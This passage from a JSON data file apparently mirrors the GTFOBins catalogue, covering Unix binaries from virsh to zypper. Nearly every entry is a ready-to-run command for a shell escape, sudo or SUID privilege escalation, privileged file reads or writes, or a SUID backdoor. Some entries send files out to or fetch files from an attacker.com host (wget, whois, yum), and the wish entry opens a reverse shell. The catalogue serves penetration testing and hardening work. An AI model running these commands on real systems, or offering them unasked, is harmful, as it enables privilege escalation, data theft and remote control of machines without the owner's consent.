        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThis requires the user to be in the libvirt group to perform privileged file read.\nLFILE_DIR=/root\nLFILE_NAME=file_to_read\n\nSPATH=file_to_save\n\nvirsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR\nvirsh -c qemu:///system vol-download --pool x $LFILE_NAME $SPATH\nvirsh -c qemu:///system pool-destroy x\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nSCRIPT=script_to_run\nTF=$(mktemp)\ncat > $TF << EOF\n<domain type='kvm'>\n  <name>x</name>\n  <os>\n    <type arch='x86_64'>hvm</type>\n  </os>\n  <memory unit='KiB'>1</memory>\n  <devices>\n    <interface type='ethernet'>\n      <script path='$SCRIPT'/>\n    </interface>\n  </devices>\n</domain>\nEOF\nsudo virsh -c qemu:///system create $TF\nvirsh -c qemu:///system destroy x"
      }
    ]
  },
  {
    "id": 309,
    "bin": "volatility",
    "url": "/gtfobins/volatility/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nvolatility -f file.dump volshell\n__import__('os').system('/bin/sh')"
      }
    ]
  },
  {
    "id": 310,
    "bin": "wall",
    "url": "/gtfobins/wall/",
    "funcs": [
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo wall --nobanner \"$LFILE\""
      }
    ]
  },
  {
    "id": 311,
    "bin": "watch",
    "url": "/gtfobins/watch/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nwatch -x sh -c 'reset; exec sh 1>&0 2>&0'\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nThis keeps the SUID privileges only if the -x option is present.\nsudo install -m =xs $(which watch) .\n\n./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which watch) .\n\n./watch 'reset; exec sh 1>&0 2>&0'"
      }
    ]
  },
  {
    "id": 312,
    "bin": "wc",
    "url": "/gtfobins/wc/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nwc --files0-from \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which wc) .\n\nLFILE=file_to_read\n./wc --files0-from \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo wc --files0-from \"$LFILE\""
      }
    ]
  },
  {
    "id": 313,
    "bin": "wget",
    "url": "/gtfobins/wget/",
    "funcs": [
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nSend local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Use --post-data to send hard-coded data.\nURL=http://attacker.com/\nLFILE=file_to_send\nwget --post-file=$LFILE $URL\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nFetch a remote file via HTTP GET request.\nURL=http://attacker.com/file_to_get\nLFILE=file_to_save\nwget $URL -O $LFILE\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nThe data to be written is treated as a list of URLs, one per line, which are actually fetched by wget. The data is written, somewhat modified, as error messages, thus this is not suitable to write arbitrary binary data.\nLFILE=file_to_write\nTF=$(mktemp)\necho DATA > $TF\nwget -i $TF -o $LFILE\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThe file to be read is treated as a list of URLs, one per line, which are actually fetched by wget. The content appears, somewhat modified, as error messages, thus this is not suitable to read arbitrary binary data.\nLFILE=file_to_read\nwget -i $LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nFetch a remote file via HTTP GET request.\nsudo install -m =xs $(which wget) .\n\nURL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./wget $URL -O $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nFetch a remote file via HTTP GET request.\nURL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo wget $URL -O $LFILE"
      }
    ]
  },
  {
    "id": 314,
    "bin": "whiptail",
    "url": "/gtfobins/whiptail/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nwhiptail --textbox --scrolltext \"$LFILE\" 0 0\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which whiptail) .\n\nLFILE=file_to_read\n./whiptail --textbox --scrolltext \"$LFILE\" 0 0\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo whiptail --textbox --scrolltext \"$LFILE\" 0 0"
      }
    ]
  },
  {
    "id": 315,
    "bin": "whois",
    "url": "/gtfobins/whois/",
    "funcs": [
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nSend a text file to a TCP port. Run nc -l -p 12345 > \"file_to_save\" on the attacker box to collect the file. The file has a trailing $'\\x0d\\x0a' and its length is limited by the maximum size of arguments.\nRHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nwhois -h $RHOST -p $RPORT \"`cat $LFILE`\"\n\n\nSend a binary file to a TCP port. Run nc -l -p 12345 | tr -d $'\\x0d' | base64 -d > \"file_to_save\" on the attacker box to collect the file. The file length is limited by the maximum size of arguments.\nRHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nwhois -h $RHOST -p $RPORT \"`base64 $LFILE`\"\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nFetch remote text file from a remote TCP port. Run nc -l -p 12345 < \"file_to_send\" on the attacker box to send the file. The file has instances of $'\\x0d' stripped.\nRHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nwhois -h $RHOST -p $RPORT > \"$LFILE\"\n\n\nFetch remote binary file from a remote TCP port. Run base64 \"file_to_send\" | nc -l -p 12345 on the attacker box to send the file.\nRHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nwhois -h $RHOST -p $RPORT | base64 -d > \"$LFILE\""
      }
    ]
  },
  {
    "id": 316,
    "bin": "wireshark",
    "url": "/gtfobins/wireshark/",
    "funcs": [
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nThis technique can be used to write arbitrary files, i.e., the dump of one UDP packet.\nAfter starting Wireshark, and waiting for the capture to begin, deliver the UDP packet, e.g., with nc (see below). The capture then stops and the packet dump can be saved:\n\n\nselect the only received packet;\n\n\nright-click on \u201cData\u201d from the \u201cPacket Details\u201d pane, and select \u201cExport Packet Bytes\u2026\u201d;\n\n\nchoose where to save the packet dump.\n\n\nPORT=4444\nsudo wireshark -c 1 -i lo -k -f \"udp port $PORT\" &\necho 'DATA' | nc -u 127.127.127.127 \"$PORT\""
      }
    ]
  },
  {
    "id": 317,
    "bin": "wish",
    "url": "/gtfobins/wish/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nwish\nexec /bin/sh <@stdin >@stdout 2>@stderr\n\n"
      },
      {
        "func": "Non-interactive reverse shell",
        "man": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.\n\n\nRun nc -l -p 12345 on the attacker box to receive the shell.\nexport RHOST=attacker.com\nexport RPORT=12345\necho 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s \"> \";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | wish\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo wish\nexec /bin/sh <@stdin >@stdout 2>@stderr"
      }
    ]
  },
  {
    "id": 318,
    "bin": "xargs",
    "url": "/gtfobins/xargs/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nGNU version only.\nxargs -a /dev/null sh\n\n\necho x | xargs -Iy sh -c 'exec sh 0<&1'\n\n\nRead interactively from stdin.\nxargs -Ix sh -c 'exec sh 0<&1'\nx^D^D\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThis works as long as the file does not contain the NUL character, also a trailing $'\\n' is added. The actual /bin/echo command is executed. GNU version only.\nLFILE=file_to_read\nxargs -a \"$LFILE\" -0\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nGNU version only.\nsudo install -m =xs $(which xargs) .\n\n./xargs -a /dev/null sh -p\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nGNU version only.\nsudo xargs -a /dev/null sh"
      }
    ]
  },
  {
    "id": 319,
    "bin": "xdotool",
    "url": "/gtfobins/xdotool/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nxdotool exec --sync /bin/sh\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which xdotool) .\n\n./xdotool exec --sync /bin/sh -p\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo xdotool exec --sync /bin/sh"
      }
    ]
  },
  {
    "id": 320,
    "bin": "xelatex",
    "url": "/gtfobins/xelatex/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nxelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThe read file will be part of the output.\nxelatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nThe read file will be part of the output.\nsudo xelatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n\n\nsudo xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which xelatex) .\n\n./xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"
      }
    ]
  },
  {
    "id": 321,
    "bin": "xetex",
    "url": "/gtfobins/xetex/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nxetex --shell-escape '\\write18{/bin/sh}\\end'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo xetex --shell-escape '\\write18{/bin/sh}\\end'\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which xetex) .\n\n./xetex --shell-escape '\\write18{/bin/sh}\\end'"
      }
    ]
  },
  {
    "id": 322,
    "bin": "xmodmap",
    "url": "/gtfobins/xmodmap/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nxmodmap -v $LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which xmodmap) .\n\nLFILE=file_to_read\n./xmodmap -v $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo xmodmap -v $LFILE"
      }
    ]
  },
  {
    "id": 323,
    "bin": "xmore",
    "url": "/gtfobins/xmore/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nxmore $LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which xmore) .\n\nLFILE=file_to_read\n./xmore $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo xmore $LFILE"
      }
    ]
  },
  {
    "id": 324,
    "bin": "xpad",
    "url": "/gtfobins/xpad/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nxpad -f \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo xpad -f \"$LFILE\""
      }
    ]
  },
  {
    "id": 325,
    "bin": "xxd",
    "url": "/gtfobins/xxd/",
    "funcs": [
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nLFILE=file_to_write\necho DATA | xxd | xxd -r - \"$LFILE\"\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nxxd \"$LFILE\" | xxd -r\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which xxd) .\n\nLFILE=file_to_read\n./xxd \"$LFILE\" | xxd -r\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo xxd \"$LFILE\" | xxd -r"
      }
    ]
  },
  {
    "id": 326,
    "bin": "xz",
    "url": "/gtfobins/xz/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nxz -c \"$LFILE\" | xz -d\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which xz) .\n\nLFILE=file_to_read\n./xz -c \"$LFILE\" | xz -d\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo xz -c \"$LFILE\" | xz -d"
      }
    ]
  },
  {
    "id": 327,
    "bin": "yarn",
    "url": "/gtfobins/yarn/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nyarn exec /bin/sh\n\n\nAdditionally, arbitrary script names can be used in place of preinstall and triggered by name with, e.g., yarn --cwd $TF run preinstall.\nTF=$(mktemp -d)\necho '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json\nyarn --cwd $TF install\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo yarn exec /bin/sh"
      }
    ]
  },
  {
    "id": 328,
    "bin": "yash",
    "url": "/gtfobins/yash/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nyash\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which yash) .\n\n./yash\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo yash"
      }
    ]
  },
  {
    "id": 329,
    "bin": "yelp",
    "url": "/gtfobins/yelp/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThis spawns a graphical window containing the file content somehow corrupted by word wrapping, it might not be suitable to read arbitrary files. The path must be absolute.\nLFILE=file_to_read\nyelp \"man:$LFILE\""
      }
    ]
  },
  {
    "id": 330,
    "bin": "yum",
    "url": "/gtfobins/yum/",
    "funcs": [
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nFetch a remote file via HTTP GET request. The file on the remote host must have an extension of .rpm, the content does not have to be an RPM file. The file will be downloaded to a randomly created directory in /var/tmp, for example /var/tmp/yum-root-cR0O4h/.\nRHOST=attacker.com\nRFILE=file_to_get.rpm\nyum install http://$RHOST/$RFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nIt runs commands using a specially crafted RPM package. Generate it with fpm and upload it to the target.\nTF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n\nsudo yum localinstall -y x-1.0-1.noarch.rpm\n\n\nSpawn interactive root shell by loading a custom plugin.\nTF=$(mktemp -d)\ncat >$TF/x<<EOF\n[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF\nEOF\n\ncat >$TF/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\ncat >$TF/y.py<<EOF\nimport os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  os.execl('/bin/sh','/bin/sh')\nEOF\n\nsudo yum -c $TF/x --enableplugin=y"
      }
    ]
  },
  {
    "id": 331,
    "bin": "zathura",
    "url": "/gtfobins/zathura/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nzathura\n:! /bin/sh -c 'exec /bin/sh 0<&1'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo zathura\n:! /bin/sh -c 'exec /bin/sh 0<&1'"
      }
    ]
  },
  {
    "id": 332,
    "bin": "zip",
    "url": "/gtfobins/zip/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nTF=$(mktemp -u)\nzip $TF /etc/hosts -T -TT 'sh #'\nrm $TF\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file-to-read\nTF=$(mktemp -u)\nzip $TF $LFILE\nunzip -p $TF\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nTF=$(mktemp -u)\nsudo zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which zip) .\n\nTF=$(mktemp -u)\n./zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF"
      }
    ]
  },
  {
    "id": 333,
    "bin": "zsh",
    "url": "/gtfobins/zsh/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nzsh\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nexport LFILE=file_to_write\nzsh -c 'echo DATA >$LFILE'\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nexport LFILE=file_to_read\nzsh -c 'echo \"$(<$LFILE)\"'\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which zsh) .\n\n./zsh\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo zsh"
      }
    ]
  },
  {
    "id": 334,
    "bin": "zsoelim",
    "url": "/gtfobins/zsoelim/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nzsoelim \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which zsoelim) .\n\nLFILE=file_to_read\n./zsoelim \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo zsoelim \"$LFILE\""
      }
    ]
  },
  {
    "id": 335,
    "bin": "zypper",
    "url": "/gtfobins/zypper/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nThis requires /bin/sh to be copied to /usr/lib/zypper/commands/zypper-x and this usually requires elevated privileges.\nzypper x\n\n\nTF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nexport PATH=$TF:$PATH\nzypper x\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nThis requires /bin/sh to be copied to /usr/lib/zypper/commands/zypper-x and this usually requires elevated privileges.\nsudo zypper x\n\n\nTF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nsudo PATH=$TF:$PATH zypper x"
      }
    ]
  }
]